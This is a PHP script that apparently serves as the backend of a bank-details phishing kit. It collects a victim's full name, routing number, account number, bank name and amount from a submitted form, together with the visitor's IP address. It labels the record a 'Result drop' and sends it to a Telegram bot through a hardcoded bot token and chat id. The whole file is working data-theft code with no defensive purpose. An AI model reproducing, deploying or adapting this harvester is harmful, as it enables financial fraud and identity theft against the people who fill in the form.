<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

$user_id = "7335419075"; // Chat id
$botToken = "7140746335:AAEYFWzxPI_-InPdYqwC3ViaPbZ7Jm6KUOs"; //Bot token
$recipient = "blairphillip1@yandex.com";  // Replace with the actual email address

function get_client_ip()
{
    $ipaddress = "";
    if (getenv("HTTP_CLIENT_IP"))
        $ipaddress = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("HTTP_X_FORWARDED"))
        $ipaddress = getenv("HTTP_X_FORWARDED");
    else if (getenv("HTTP_FORWARDED_FOR"))
        $ipaddress = getenv("HTTP_FORWARDED_FOR");
    else if (getenv("HTTP_FORWARDED"))
        $ipaddress = getenv("HTTP_FORWARDED");
    else if (getenv("REMOTE_ADDR"))
        $ipaddress = getenv("REMOTE_ADDR");
    else
        $ipaddress = "UNKNOWN";
    return $ipaddress;
}

$amount = $_POST['amount'];
$fullname = $_POST['fullname'];
$Routenumber = $_POST['Routenumber'];
$account = $_POST['account'];
$Bankname = $_POST['Bankname'];


$IP = get_client_ip();


    $message .= "---|Result drop|---\n";
    $message .= "amount		: " . $amount . "\n";
    $message .= "fullname	: " . $fullname . "\n";
    $message .= "Routenumber		: " . $Routenumber. "\n";
    $message .= "account	: " . $account . "\n";
    $message .= "Bankname		: " . $Bankname . "\n";
    $message .= "IP : " . $IP . "\n";

$website = "https://api.telegram.org/bot{$botToken}";
$params = [
    'chat_id' => $user_id,
    'text' => $message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


if ($result !== false) {

    echo "Form data sent to Telegram successfully!";
} else {

    echo "Failed to send form data to Telegram.";
}
?>
